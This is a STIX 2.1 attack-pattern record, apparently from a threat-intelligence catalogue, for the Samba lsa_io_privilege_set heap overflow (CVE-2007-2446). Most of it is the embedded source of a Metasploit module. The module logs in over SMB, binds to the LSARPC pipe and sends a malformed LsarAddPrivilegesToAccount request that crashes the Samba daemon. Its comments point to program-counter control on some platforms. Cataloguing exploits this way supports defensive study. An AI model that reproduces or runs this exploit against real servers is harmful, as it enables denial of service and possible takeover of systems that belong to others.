{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8f96a845-2f74-4b48-88ac-30e747f488e5",
    "created": "2024-08-14T16:24:24.578431Z",
    "modified": "2024-08-14T16:24:24.578435Z",
    "name": "Samba lsa_io_privilege_set Heap Overflow",
    "description": " This module triggers a heap overflow in the LSA RPC service of the Samba daemon. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/samba/lsa_addprivs_heap.rb",
            "external_id": "lsa_addprivs_heap.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-2446"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::DCERPC\n  include Msf::Exploit::Remote::SMB::Client\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Samba lsa_io_privilege_set Heap Overflow',\n      'Description'    => %q{\n        This module triggers a heap overflow in the LSA RPC service\n      of the Samba daemon.\n      },\n      'Author'         => [ 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2007-2446'],\n          ['OSVDB', '34699'],\n        ]\n      ))\n\n    register_options(\n      [\n        OptString.new('SMBPIPE', [ true,  \"The pipe name to use\", 'LSARPC']),\n      ])\n\n  end\n\n  def run\n\n    pipe = datastore['SMBPIPE'].downcase\n\n    print_status(\"Connecting to the SMB service...\")\n    connect()\n    smb_login()\n\n    datastore['DCERPC::fake_bind_multi'] = false\n\n    handle = dcerpc_handle('12345778-1234-abcd-ef00-0123456789ab', '0.0', 'ncacn_np', [\"\\\\#{pipe}\"])\n    print_status(\"Binding to #{handle} ...\")\n    dcerpc_bind(handle)\n    print_status(\"Bound to #{handle} ...\")\n\n    # Linux: Needs heap magic to work around glibc (or TALLOC mode for 3.0.20+)\n    # Mac OS X: PC control via memcpy to stack ptr\n    # Solaris: PC control via memcpy to stack ptr\n\n    stub = lsa_open_policy(dcerpc)\n    stub << NDR.long(1)\n    stub << NDR.long(0xffffffff)\n    stub << NDR.long(0x100)\n    stub << \"X\" * 0x100\n\n    print_status(\"Calling the vulnerable function...\")\n\n    begin\n      # LsarAddPrivilegesToAccount\n      dcerpc.call(0x13, stub)\n    rescue Rex::Proto::DCERPC::Exceptions::NoResponse\n      print_good('Server did not respond, this is expected')\n    rescue => e\n      if e.to_s =~ /STATUS_PIPE_DISCONNECTED/\n        print_good('Server disconnected, this is expected')\n      else\n        raise e\n      end\n    end\n\n    disconnect\n  end\nend\n"
}